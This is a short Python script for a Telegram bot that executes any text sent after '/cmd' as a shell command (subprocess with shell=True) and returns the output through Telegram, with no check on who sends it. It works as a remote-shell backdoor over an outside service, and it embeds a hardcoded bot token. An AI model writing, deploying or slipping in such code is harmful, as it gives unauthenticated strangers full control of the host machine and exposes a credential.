import telebot
import subprocess

def run_bot():
    BOT_TOKEN = '7730673603:AAGoYg5nmm5H8kQMe4vFeOi5-ZqNCHU-XPs'
    bot = telebot.TeleBot(BOT_TOKEN)

    @bot.message_handler(commands=['cmd'])
    def execute_command(message):
        command = message.text[5:]  # Rimuove '/cmd '
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            bot.reply_to(message, f"Output:\n{output.decode()}")
        except subprocess.CalledProcessError as e:
            bot.reply_to(message, f"Errore:\n{e.output.decode()}")

    bot.polling()